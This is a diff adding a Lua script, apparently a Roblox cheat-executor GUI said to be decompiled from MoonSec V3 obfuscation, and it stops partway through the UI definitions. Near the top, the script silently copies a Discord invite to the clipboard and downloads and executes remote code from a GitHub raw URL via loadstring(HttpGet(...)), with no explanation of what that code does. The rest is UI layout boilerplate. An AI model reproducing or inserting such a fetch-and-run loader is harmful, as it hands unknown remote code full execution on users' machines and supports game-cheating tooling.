@@ -1,0 +1,3432 @@
+-- Decompiled from MoonSec V3 disassembly
+-- (best-effort; control flow may need minor manual cleanup)
+-- By ZeroVector101
+_G.tidolbaeb = "ti dymal esly ispolsiesh _G to naidesh choto tak vot ti nashel"
+print("Credits to Sten for the original source")
+print("by : (slade_yt) discord")
+print("Server discord (https://discord.gg/HjNaYs6AnV) - copied")
+print("RightControl open or close gui")
+print("if you find a bug, write to me (my discord) ")
+print("Fixed Solara Updated 2.3 (Version)")
+setclipboard("https://discord.gg/HjNaYs6AnV")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-v2-source-/main/listing.txt"))()
+local config = {}
+config.main_color = Color3.fromRGB(41, 74, 122)
+config.min_size = Vector2.new(400, 300)
+config.toggle_key = Enum.KeyCode.RightShift
+config.can_resize = true
+local CoreGui = game:GetService("CoreGui")
+local v = CoreGui:FindFirstChild("imgui")
+
+if v then
+    v:Destroy()
+end
+
+local screenGui = Instance.new("ScreenGui")
+local frame = Instance.new("Frame")
+local textLabel = Instance.new("TextLabel")
+local imageLabel = Instance.new("ImageLabel")
+local frame2 = Instance.new("Frame")
+local frame3 = Instance.new("Frame")
+local imageButton = Instance.new("ImageButton")
+local imageLabel2 = Instance.new("ImageLabel")
+local imageLabel3 = Instance.new("ImageLabel")
+local frame4 = Instance.new("Frame")
+local textLabel2 = Instance.new("TextLabel")
+local imageLabel4 = Instance.new("ImageLabel")
+local frame5 = Instance.new("Frame")
+local uIListLayout = Instance.new("UIListLayout")
+local frame6 = Instance.new("Frame")
+local frame7 = Instance.new("Frame")
+local uIListLayout2 = Instance.new("UIListLayout")
+local textBox = Instance.new("TextBox")
+local imageLabel5 = Instance.new("ImageLabel")
+local imageLabel6 = Instance.new("ImageLabel")
+local textLabel3 = Instance.new("TextLabel")
+local imageLabel7 = Instance.new("ImageLabel")
+local textLabel4 = Instance.new("TextLabel")
+local textLabel5 = Instance.new("TextLabel")
+local textLabel6 = Instance.new("TextLabel")
+local imageLabel8 = Instance.new("ImageLabel")
+local uIListLayout3 = Instance.new("UIListLayout")
+local textButton = Instance.new("TextButton")
+local imageLabel9 = Instance.new("ImageLabel")
+local imageButton2 = Instance.new("ImageButton")
+local scrollingFrame = Instance.new("ScrollingFrame")
+local uIListLayout4 = Instance.new("UIListLayout")
+local imageLabel10 = Instance.new("ImageLabel")
+local textButton2 = Instance.new("TextButton")
+local imageLabel11 = Instance.new("ImageLabel")
+local imageLabel12 = Instance.new("ImageLabel")
+local textButton3 = Instance.new("TextButton")
+local imageLabel13 = Instance.new("ImageLabel")
+local imageLabel14 = Instance.new("ImageLabel")
+local frame8 = Instance.new("Frame")
+local uIListLayout5 = Instance.new("UIListLayout")
+local frame9 = Instance.new("Frame")
+local uIListLayout6 = Instance.new("UIListLayout")
+local imageLabel15 = Instance.new("ImageLabel")
+local scrollingFrame2 = Instance.new("ScrollingFrame")
+local textBox2 = Instance.new("TextBox")
+local textLabel7 = Instance.new("TextLabel")
+local textLabel8 = Instance.new("TextLabel")
+local textLabel9 = Instance.new("TextLabel")
+local textLabel10 = Instance.new("TextLabel")
+local textLabel11 = Instance.new("TextLabel")
+local textLabel12 = Instance.new("TextLabel")
+local textLabel13 = Instance.new("TextLabel")
+local textLabel14 = Instance.new("TextLabel")
+local textLabel15 = Instance.new("TextLabel")
+local imageLabel16 = Instance.new("ImageLabel")
+local imageLabel17 = Instance.new("ImageLabel")
+local imageLabel18 = Instance.new("ImageLabel")
+local imageLabel19 = Instance.new("ImageLabel")
+local imageLabel20 = Instance.new("ImageLabel")
+local frame10 = Instance.new("Frame")
+local textButton4 = Instance.new("TextButton")
+local imageLabel21 = Instance.new("ImageLabel")
+local textLabel16 = Instance.new("TextLabel")
+local textButton5 = Instance.new("TextButton")
+local imageLabel22 = Instance.new("ImageLabel")
+local textButton6 = Instance.new("TextButton")
+local imageLabel23 = Instance.new("ImageLabel")
+local textLabel17 = Instance.new("TextLabel")
+local textButton7 = Instance.new("TextButton")
+local imageLabel24 = Instance.new("ImageLabel")
+local frame11 = Instance.new("Frame")
+screenGui.Name = "imgui"
+local CoreGui2 = game:GetService("CoreGui")
+screenGui.Parent = CoreGui2
+frame.Name = "Prefabs"
+frame.Parent = screenGui
+frame.BackgroundColor3 = Color3.new(1, 1, 1)
+frame.Size = UDim2.new(0, 100, 0, 100)
+frame.Visible = false
+textLabel.Name = "Label"
+textLabel.Parent = frame
+textLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel.BackgroundTransparency = 1
+textLabel.Size = UDim2.new(0, 200, 0, 20)
+textLabel.Font = Enum.Font.GothamSemibold
+textLabel.Text = "Hello, world 123"
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.TextSize = 14
+textLabel.TextXAlignment = Enum.TextXAlignment.Left
+imageLabel.Name = "Window"
+imageLabel.Parent = frame
+imageLabel.Active = true
+imageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel.BackgroundTransparency = 1
+imageLabel.ClipsDescendants = true
+imageLabel.Position = UDim2.new(0, 20, 0, 20)
+imageLabel.Selectable = true
+imageLabel.Size = UDim2.new(0, 200, 0, 200)
+imageLabel.Image = "rbxassetid://2851926732"
+imageLabel.ImageColor3 = Color3.new(0.0823529, 0.0862745, 0.0901961)
+imageLabel.ScaleType = Enum.ScaleType.Slice
+imageLabel.SliceCenter = Rect.new(12, 12, 12, 12)
+frame2.Name = "Resizer"
+frame2.Parent = imageLabel
+frame2.Active = true
+frame2.BackgroundColor3 = Color3.new(1, 1, 1)
+frame2.BackgroundTransparency = 1
+frame2.BorderSizePixel = 0
+frame2.Position = UDim2.new(1, -20, 1, -20)
+frame2.Size = UDim2.new(0, 20, 0, 20)
+frame3.Name = "Bar"
+frame3.Parent = imageLabel
+frame3.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+frame3.BorderSizePixel = 0
+frame3.Position = UDim2.new(0, 0, 0, 5)
+frame3.Size = UDim2.new(1, 0, 0, 15)
+imageButton.Name = "Toggle"
+imageButton.Parent = frame3
+imageButton.BackgroundColor3 = Color3.new(1, 1, 1)
+imageButton.BackgroundTransparency = 1
+imageButton.Position = UDim2.new(0, 5, 0, -2)
+imageButton.Rotation = 90
+imageButton.Size = UDim2.new(0, 20, 0, 20)
+imageButton.ZIndex = 2
+imageButton.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4731371541"
+imageLabel2.Name = "Base"
+imageLabel2.Parent = frame3
+imageLabel2.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+imageLabel2.BorderSizePixel = 0
+imageLabel2.Position = UDim2.new(0, 0, 0.800000012, 0)
+imageLabel2.Size = UDim2.new(1, 0, 0, 10)
+imageLabel2.Image = "rbxassetid://2851926732"
+imageLabel2.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+imageLabel2.ScaleType = Enum.ScaleType.Slice
+imageLabel2.SliceCenter = Rect.new(12, 12, 12, 12)
+imageLabel3.Name = "Top"
+imageLabel3.Parent = frame3
+imageLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel3.BackgroundTransparency = 1
+imageLabel3.Position = UDim2.new(0, 0, 0, -5)
+imageLabel3.Size = UDim2.new(1, 0, 0, 10)
+imageLabel3.Image = "rbxassetid://2851926732"
+imageLabel3.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+imageLabel3.ScaleType = Enum.ScaleType.Slice
+imageLabel3.SliceCenter = Rect.new(12, 12, 12, 12)
+frame4.Name = "Tabs"
+frame4.Parent = imageLabel
+frame4.BackgroundColor3 = Color3.new(1, 1, 1)
+frame4.BackgroundTransparency = 1
+frame4.Position = UDim2.new(0, 5, 0, 60)
+frame4.Size = UDim2.new(1, -10, 1, -60)
+textLabel2.Name = "Title"
+textLabel2.Parent = imageLabel
+textLabel2.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel2.BackgroundTransparency = 1
+textLabel2.Position = UDim2.new(0, 30, 0, 3)
+textLabel2.Size = UDim2.new(0, 200, 0, 20)
+textLabel2.Font = Enum.Font.GothamBold
+textLabel2.Text = "Gamer Time"
+textLabel2.TextColor3 = Color3.new(1, 1, 1)
+textLabel2.TextSize = 14
+textLabel2.TextXAlignment = Enum.TextXAlignment.Left
+imageLabel4.Name = "TabSelection"
+imageLabel4.Parent = imageLabel
+imageLabel4.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel4.BackgroundTransparency = 1
+imageLabel4.Position = UDim2.new(0, 5, 0, 30)
+imageLabel4.Size = UDim2.new(1, -10, 0, 25)
+imageLabel4.Visible = false
+imageLabel4.Image = "rbxassetid://2851929490"
+imageLabel4.ImageColor3 = Color3.new(0.145098, 0.14902, 0.156863)
+imageLabel4.ScaleType = Enum.ScaleType.Slice
+imageLabel4.SliceCenter = Rect.new(4, 4, 4, 4)
+frame5.Name = "TabButtons"
+frame5.Parent = imageLabel4
+frame5.BackgroundColor3 = Color3.new(1, 1, 1)
+frame5.BackgroundTransparency = 1
+frame5.Size = UDim2.new(1, 0, 1, 0)
+uIListLayout.Parent = frame5
+uIListLayout.FillDirection = Enum.FillDirection.Horizontal
+uIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+uIListLayout.Padding = UDim.new(0, 2)
+frame6.Parent = imageLabel4
+frame6.BackgroundColor3 = Color3.new(0.12549, 0.227451, 0.372549)
+frame6.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+frame6.BorderSizePixel = 0
+frame6.Position = UDim2.new(0, 0, 1, 0)
+frame6.Size = UDim2.new(1, 0, 0, 2)
+frame7.Name = "Tab"
+frame7.Parent = frame
+frame7.BackgroundColor3 = Color3.new(1, 1, 1)
+frame7.BackgroundTransparency = 1
+frame7.Size = UDim2.new(1, 0, 1, 0)
+frame7.Visible = false
+uIListLayout2.Parent = frame7
+uIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
+uIListLayout2.Padding = UDim.new(0, 5)
+textBox.Parent = frame
+textBox.BackgroundColor3 = Color3.new(1, 1, 1)
+textBox.BackgroundTransparency = 1
+textBox.BorderSizePixel = 0
+textBox.Size = UDim2.new(1, 0, 0, 20)
+textBox.ZIndex = 2
+textBox.Font = Enum.Font.GothamSemibold
+textBox.PlaceholderColor3 = Color3.new(0.698039, 0.698039, 0.698039)
+textBox.PlaceholderText = "Input Text"
+textBox.Text = ""
+textBox.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textBox.TextSize = 14
+imageLabel5.Name = "TextBox_Roundify_4px"
+imageLabel5.Parent = textBox
+imageLabel5.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel5.BackgroundTransparency = 1
+imageLabel5.Size = UDim2.new(1, 0, 1, 0)
+imageLabel5.Image = "rbxassetid://2851929490"
+imageLabel5.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
+imageLabel5.ScaleType = Enum.ScaleType.Slice
+imageLabel5.SliceCenter = Rect.new(4, 4, 4, 4)
+imageLabel6.Name = "Slider"
+imageLabel6.Parent = frame
+imageLabel6.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel6.BackgroundTransparency = 1
+imageLabel6.Position = UDim2.new(0, 0, 0.178571433, 0)
+imageLabel6.Size = UDim2.new(1, 0, 0, 20)
+imageLabel6.Image = "rbxassetid://2851929490"
+imageLabel6.ImageColor3 = Color3.new(0.145098, 0.14902, 0.156863)
+imageLabel6.ScaleType = Enum.ScaleType.Slice
+imageLabel6.SliceCenter = Rect.new(4, 4, 4, 4)
+textLabel3.Name = "Title"
+textLabel3.Parent = imageLabel6
+textLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel3.BackgroundTransparency = 1
+textLabel3.Position = UDim2.new(0.5, 0, 0.5, -10)
+textLabel3.Size = UDim2.new(0, 0, 0, 20)
+textLabel3.ZIndex = 2
+textLabel3.Font = Enum.Font.GothamBold
+textLabel3.Text = "Slider"
+textLabel3.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textLabel3.TextSize = 14
+imageLabel7.Name = "Indicator"
+imageLabel7.Parent = imageLabel6
+imageLabel7.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel7.BackgroundTransparency = 1
+imageLabel7.Size = UDim2.new(0, 0, 0, 20)
+imageLabel7.Image = "rbxassetid://2851929490"
+imageLabel7.ImageColor3 = Color3.new(0.254902, 0.262745, 0.278431)
+imageLabel7.ScaleType = Enum.ScaleType.Slice
+imageLabel7.SliceCenter = Rect.new(4, 4, 4, 4)
+textLabel4.Name = "Value"
+textLabel4.Parent = imageLabel6
+textLabel4.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel4.BackgroundTransparency = 1
+textLabel4.Position = UDim2.new(1, -55, 0.5, -10)
+textLabel4.Size = UDim2.new(0, 50, 0, 20)
+textLabel4.Font = Enum.Font.GothamBold
+textLabel4.Text = "0%"
+textLabel4.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textLabel4.TextSize = 14
+textLabel5.Parent = imageLabel6
+textLabel5.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel5.BackgroundTransparency = 1
+textLabel5.Position = UDim2.new(1, -20, -0.75, 0)
+textLabel5.Size = UDim2.new(0, 26, 0, 50)
+textLabel5.Font = Enum.Font.GothamBold
+textLabel5.Text = "]"
+textLabel5.TextColor3 = Color3.new(0.627451, 0.627451, 0.627451)
+textLabel5.TextSize = 14
+textLabel6.Parent = imageLabel6
+textLabel6.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel6.BackgroundTransparency = 1
+textLabel6.Position = UDim2.new(1, -65, -0.75, 0)
+textLabel6.Size = UDim2.new(0, 26, 0, 50)
+textLabel6.Font = Enum.Font.GothamBold
+textLabel6.Text = "["
+textLabel6.TextColor3 = Color3.new(0.627451, 0.627451, 0.627451)
+textLabel6.TextSize = 14
+imageLabel8.Name = "Circle"
+imageLabel8.Parent = frame
+imageLabel8.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel8.BackgroundTransparency = 1
+imageLabel8.Image = "rbxassetid://266543268"
+imageLabel8.ImageTransparency = 0.5
+uIListLayout3.Parent = frame
+uIListLayout3.FillDirection = Enum.FillDirection.Horizontal
+uIListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
+uIListLayout3.Padding = UDim.new(0, 20)
+textButton.Name = "Dropdown"
+textButton.Parent = frame
+textButton.BackgroundColor3 = Color3.new(1, 1, 1)
+textButton.BackgroundTransparency = 1
+textButton.BorderSizePixel = 0
+textButton.Position = UDim2.new(-0.055555556, 0, 0.0833333284, 0)
+textButton.Size = UDim2.new(1, 0, 0, 20)
+textButton.ZIndex = 2
+textButton.Font = Enum.Font.GothamBold
+textButton.Text = " Dropdown"
+textButton.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textButton.TextSize = 14
+textButton.TextXAlignment = Enum.TextXAlignment.Left
+imageLabel9.Name = "Indicator"
+imageLabel9.Parent = textButton
+imageLabel9.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel9.BackgroundTransparency = 1
+imageLabel9.Position = UDim2.new(0.899999976, -10, 0.100000001, 0)
+imageLabel9.Rotation = -90
+imageLabel9.Size = UDim2.new(0, 15, 0, 15)
+imageLabel9.ZIndex = 2
+imageLabel9.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4744658743"
+imageButton2.Name = "Box"
+imageButton2.Parent = textButton
+imageButton2.BackgroundColor3 = Color3.new(1, 1, 1)
+imageButton2.BackgroundTransparency = 1
+imageButton2.Position = UDim2.new(0, 0, 0, 25)
+imageButton2.Size = UDim2.new(1, 0, 0, 150)
+imageButton2.ZIndex = 3
+imageButton2.Image = "rbxassetid://2851929490"
+imageButton2.ImageColor3 = Color3.new(0.129412, 0.133333, 0.141176)
+imageButton2.ScaleType = Enum.ScaleType.Slice
+imageButton2.SliceCenter = Rect.new(4, 4, 4, 4)
+scrollingFrame.Name = "Objects"
+scrollingFrame.Parent = imageButton2
+scrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+scrollingFrame.BackgroundTransparency = 1
+scrollingFrame.BorderSizePixel = 0
+scrollingFrame.Size = UDim2.new(1, 0, 1, 0)
+scrollingFrame.ZIndex = 3
+scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollingFrame.ScrollBarThickness = 8
+uIListLayout4.Parent = scrollingFrame
+uIListLayout4.SortOrder = Enum.SortOrder.LayoutOrder
+imageLabel10.Name = "TextButton_Roundify_4px"
+imageLabel10.Parent = textButton
+imageLabel10.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel10.BackgroundTransparency = 1
+imageLabel10.Size = UDim2.new(1, 0, 1, 0)
+imageLabel10.Image = "rbxassetid://2851929490"
+imageLabel10.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
+imageLabel10.ScaleType = Enum.ScaleType.Slice
+imageLabel10.SliceCenter = Rect.new(4, 4, 4, 4)
+textButton2.Name = "TabButton"
+textButton2.Parent = frame
+textButton2.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+textButton2.BackgroundTransparency = 1
+textButton2.BorderSizePixel = 0
+textButton2.Position = UDim2.new(0.185185179, 0, 0, 0)
+textButton2.Size = UDim2.new(0, 71, 0, 20)
+textButton2.ZIndex = 2
+textButton2.Font = Enum.Font.GothamSemibold
+textButton2.Text = "Test tab"
+textButton2.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
+textButton2.TextSize = 14
+imageLabel11.Name = "TextButton_Roundify_4px"
+imageLabel11.Parent = textButton2
+imageLabel11.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel11.BackgroundTransparency = 1
+imageLabel11.Size = UDim2.new(1, 0, 1, 0)
+imageLabel11.Image = "rbxassetid://2851929490"
+imageLabel11.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
+imageLabel11.ScaleType = Enum.ScaleType.Slice
+imageLabel11.SliceCenter = Rect.new(4, 4, 4, 4)
+imageLabel12.Name = "Folder"
+imageLabel12.Parent = frame
+imageLabel12.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel12.BackgroundTransparency = 1
+imageLabel12.Position = UDim2.new(0, 0, 0, 50)
+imageLabel12.Size = UDim2.new(1, 0, 0, 20)
+imageLabel12.Image = "rbxassetid://2851929490"
+imageLabel12.ImageColor3 = Color3.new(0.0823529, 0.0862745, 0.0901961)
+imageLabel12.ScaleType = Enum.ScaleType.Slice
+imageLabel12.SliceCenter = Rect.new(4, 4, 4, 4)
+textButton3.Name = "Button"
+textButton3.Parent = imageLabel12
+textButton3.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+textButton3.BackgroundTransparency = 1
+textButton3.BorderSizePixel = 0
+textButton3.Size = UDim2.new(1, 0, 0, 20)
+textButton3.ZIndex = 2
+textButton3.Font = Enum.Font.GothamSemibold
+textButton3.Text = " Folder"
+textButton3.TextColor3 = Color3.new(1, 1, 1)
+textButton3.TextSize = 14
+textButton3.TextXAlignment = Enum.TextXAlignment.Left
+imageLabel13.Name = "TextButton_Roundify_4px"
+imageLabel13.Parent = textButton3
+imageLabel13.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel13.BackgroundTransparency = 1
+imageLabel13.Size = UDim2.new(1, 0, 1, 0)
+imageLabel13.Image = "rbxassetid://2851929490"
+imageLabel13.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
+imageLabel13.ScaleType = Enum.ScaleType.Slice
+imageLabel13.SliceCenter = Rect.new(4, 4, 4, 4)
+imageLabel14.Name = "Toggle"
+imageLabel14.Parent = textButton3
+imageLabel14.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel14.BackgroundTransparency = 1
+imageLabel14.Position = UDim2.new(0, 5, 0, 0)
+imageLabel14.Size = UDim2.new(0, 20, 0, 20)
+imageLabel14.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4731371541"
+frame8.Name = "Objects"
+frame8.Parent = imageLabel12
+frame8.BackgroundColor3 = Color3.new(1, 1, 1)
+frame8.BackgroundTransparency = 1
+frame8.Position = UDim2.new(0, 10, 0, 25)
+frame8.Size = UDim2.new(1, -10, 1, -25)
+frame8.Visible = false
+uIListLayout5.Parent = frame8
+uIListLayout5.SortOrder = Enum.SortOrder.LayoutOrder
+uIListLayout5.Padding = UDim.new(0, 5)
+frame9.Name = "HorizontalAlignment"
+frame9.Parent = frame
+frame9.BackgroundColor3 = Color3.new(1, 1, 1)
+frame9.BackgroundTransparency = 1
+frame9.Size = UDim2.new(1, 0, 0, 20)
+uIListLayout6.Parent = frame9
+uIListLayout6.FillDirection = Enum.FillDirection.Horizontal
+uIListLayout6.SortOrder = Enum.SortOrder.LayoutOrder
+uIListLayout6.Padding = UDim.new(0, 5)
+imageLabel15.Name = "Console"
+imageLabel15.Parent = frame
+imageLabel15.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel15.BackgroundTransparency = 1
+imageLabel15.Size = UDim2.new(1, 0, 0, 200)
+imageLabel15.Image = "rbxassetid://2851928141"
+imageLabel15.ImageColor3 = Color3.new(0.129412, 0.133333, 0.141176)
+imageLabel15.ScaleType = Enum.ScaleType.Slice
+imageLabel15.SliceCenter = Rect.new(8, 8, 8, 8)
+scrollingFrame2.Parent = imageLabel15
+scrollingFrame2.BackgroundColor3 = Color3.new(1, 1, 1)
+scrollingFrame2.BackgroundTransparency = 1
+scrollingFrame2.BorderSizePixel = 0
+scrollingFrame2.Size = UDim2.new(1, 0, 1, 1)
+scrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, 0)
+scrollingFrame2.ScrollBarThickness = 4
+textBox2.Name = "Source"
+textBox2.Parent = scrollingFrame2
+textBox2.BackgroundColor3 = Color3.new(1, 1, 1)
+textBox2.BackgroundTransparency = 1
+textBox2.Position = UDim2.new(0, 40, 0, 0)
+textBox2.Size = UDim2.new(1, -40, 0, 10000)
+textBox2.ZIndex = 3
+textBox2.ClearTextOnFocus = false
+textBox2.Font = Enum.Font.Code
+textBox2.MultiLine = true
+textBox2.PlaceholderColor3 = Color3.new(0.8, 0.8, 0.8)
+textBox2.Text = ""
+textBox2.TextColor3 = Color3.new(1, 1, 1)
+textBox2.TextSize = 15
+textBox2.TextStrokeColor3 = Color3.new(1, 1, 1)
+textBox2.TextWrapped = true
+textBox2.TextXAlignment = Enum.TextXAlignment.Left
+textBox2.TextYAlignment = Enum.TextYAlignment.Top
+textLabel7.Name = "Comments"
+textLabel7.Parent = textBox2
+textLabel7.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel7.BackgroundTransparency = 1
+textLabel7.Size = UDim2.new(1, 0, 1, 0)
+textLabel7.ZIndex = 5
+textLabel7.Font = Enum.Font.Code
+textLabel7.Text = ""
+textLabel7.TextColor3 = Color3.new(0.231373, 0.784314, 0.231373)
+textLabel7.TextSize = 15
+textLabel7.TextXAlignment = Enum.TextXAlignment.Left
+textLabel7.TextYAlignment = Enum.TextYAlignment.Top
+textLabel8.Name = "Globals"
+textLabel8.Parent = textBox2
+textLabel8.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel8.BackgroundTransparency = 1
+textLabel8.Size = UDim2.new(1, 0, 1, 0)
+textLabel8.ZIndex = 5
+textLabel8.Font = Enum.Font.Code
+textLabel8.Text = ""
+textLabel8.TextColor3 = Color3.new(0.517647, 0.839216, 0.968628)
+textLabel8.TextSize = 15
+textLabel8.TextXAlignment = Enum.TextXAlignment.Left
+textLabel8.TextYAlignment = Enum.TextYAlignment.Top
+textLabel9.Name = "Keywords"
+textLabel9.Parent = textBox2
+textLabel9.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel9.BackgroundTransparency = 1
+textLabel9.Size = UDim2.new(1, 0, 1, 0)
+textLabel9.ZIndex = 5
+textLabel9.Font = Enum.Font.Code
+textLabel9.Text = ""
+textLabel9.TextColor3 = Color3.new(0.972549, 0.427451, 0.486275)
+textLabel9.TextSize = 15
+textLabel9.TextXAlignment = Enum.TextXAlignment.Left
+textLabel9.TextYAlignment = Enum.TextYAlignment.Top
+textLabel10.Name = "RemoteHighlight"
+textLabel10.Parent = textBox2
+textLabel10.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel10.BackgroundTransparency = 1
+textLabel10.Size = UDim2.new(1, 0, 1, 0)
+textLabel10.ZIndex = 5
+textLabel10.Font = Enum.Font.Code
+textLabel10.Text = ""
+textLabel10.TextColor3 = Color3.new(0, 0.568627, 1)
+textLabel10.TextSize = 15
+textLabel10.TextXAlignment = Enum.TextXAlignment.Left
+textLabel10.TextYAlignment = Enum.TextYAlignment.Top
+textLabel11.Name = "Strings"
+textLabel11.Parent = textBox2
+textLabel11.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel11.BackgroundTransparency = 1
+textLabel11.Size = UDim2.new(1, 0, 1, 0)
+textLabel11.ZIndex = 5
+textLabel11.Font = Enum.Font.Code
+textLabel11.Text = ""
+textLabel11.TextColor3 = Color3.new(0.678431, 0.945098, 0.584314)
+textLabel11.TextSize = 15
+textLabel11.TextXAlignment = Enum.TextXAlignment.Left
+textLabel11.TextYAlignment = Enum.TextYAlignment.Top
+textLabel12.Name = "Tokens"
+textLabel12.Parent = textBox2
+textLabel12.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel12.BackgroundTransparency = 1
+textLabel12.Size = UDim2.new(1, 0, 1, 0)
+textLabel12.ZIndex = 5
+textLabel12.Font = Enum.Font.Code
+textLabel12.Text = ""
+textLabel12.TextColor3 = Color3.new(1, 1, 1)
+textLabel12.TextSize = 15
+textLabel12.TextXAlignment = Enum.TextXAlignment.Left
+textLabel12.TextYAlignment = Enum.TextYAlignment.Top
+textLabel13.Name = "Numbers"
+textLabel13.Parent = textBox2
+textLabel13.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel13.BackgroundTransparency = 1
+textLabel13.Size = UDim2.new(1, 0, 1, 0)
+textLabel13.ZIndex = 4
+textLabel13.Font = Enum.Font.Code
+textLabel13.Text = ""
+textLabel13.TextColor3 = Color3.new(1, 0.776471, 0)
+textLabel13.TextSize = 15
+textLabel13.TextXAlignment = Enum.TextXAlignment.Left
+textLabel13.TextYAlignment = Enum.TextYAlignment.Top
+textLabel14.Name = "Info"
+textLabel14.Parent = textBox2
+textLabel14.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel14.BackgroundTransparency = 1
+textLabel14.Size = UDim2.new(1, 0, 1, 0)
+textLabel14.ZIndex = 5
+textLabel14.Font = Enum.Font.Code
+textLabel14.Text = ""
+textLabel14.TextColor3 = Color3.new(0, 0.635294, 1)
+textLabel14.TextSize = 15
+textLabel14.TextXAlignment = Enum.TextXAlignment.Left
+textLabel14.TextYAlignment = Enum.TextYAlignment.Top
+textLabel15.Name = "Lines"
+textLabel15.Parent = scrollingFrame2
+textLabel15.BackgroundColor3 = Color3.new(1, 1, 1)
+textLabel15.BackgroundTransparency = 1
+textLabel15.BorderSizePixel = 0
+textLabel15.Size = UDim2.new(0, 40, 0, 10000)
+textLabel15.ZIndex = 4
+textLabel15.Font = Enum.Font.Code
+textLabel15.Text = "1\n"
+textLabel15.TextColor3 = Color3.new(1, 1, 1)
+textLabel15.TextSize = 15
+textLabel15.TextWrapped = true
+textLabel15.TextYAlignment = Enum.TextYAlignment.Top
+imageLabel16.Name = "ColorPicker"
+imageLabel16.Parent = frame
+imageLabel16.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel16.BackgroundTransparency = 1
+imageLabel16.Size = UDim2.new(0, 180, 0, 110)
+imageLabel16.Image = "rbxassetid://2851929490"
+imageLabel16.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
+imageLabel16.ScaleType = Enum.ScaleType.Slice
+imageLabel16.SliceCenter = Rect.new(4, 4, 4, 4)
+imageLabel17.Name = "Palette"
+imageLabel17.Parent = imageLabel16
+imageLabel17.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel17.BackgroundTransparency = 1
+imageLabel17.Position = UDim2.new(0.0500000007, 0, 0.0500000007, 0)
+imageLabel17.Size = UDim2.new(0, 100, 0, 100)
+imageLabel17.Image = "rbxassetid://698052001"
+imageLabel17.ScaleType = Enum.ScaleType.Slice
+imageLabel17.SliceCenter = Rect.new(4, 4, 4, 4)
+imageLabel18.Name = "Indicator"
+imageLabel18.Parent = imageLabel17
+imageLabel18.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel18.BackgroundTransparency = 1
+imageLabel18.Size = UDim2.new(0, 5, 0, 5)
+imageLabel18.ZIndex = 2
+imageLabel18.Image = "rbxassetid://2851926732"
+imageLabel18.ImageColor3 = Color3.new(0, 0, 0)
+imageLabel18.ScaleType = Enum.ScaleType.Slice
+imageLabel18.SliceCenter = Rect.new(12, 12, 12, 12)
+imageLabel19.Name = "Sample"
+imageLabel19.Parent = imageLabel16
+imageLabel19.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel19.BackgroundTransparency = 1
+imageLabel19.Position = UDim2.new(0.800000012, 0, 0.0500000007, 0)
+imageLabel19.Size = UDim2.new(0, 25, 0, 25)
+imageLabel19.Image = "rbxassetid://2851929490"
+imageLabel19.ScaleType = Enum.ScaleType.Slice
+imageLabel19.SliceCenter = Rect.new(4, 4, 4, 4)
+imageLabel20.Name = "Saturation"
+imageLabel20.Parent = imageLabel16
+imageLabel20.BackgroundColor3 = Color3.new(1, 1, 1)
+imageLabel20.Position = UDim2.new(0.649999976, 0, 0.0500000007, 0)
+imageLabel20.Size = UDim2.new(0, 15, 0, 100)
+imageLabel20.Image = "rbxassetid://3641079629"
+frame10.Name = "Indicator"
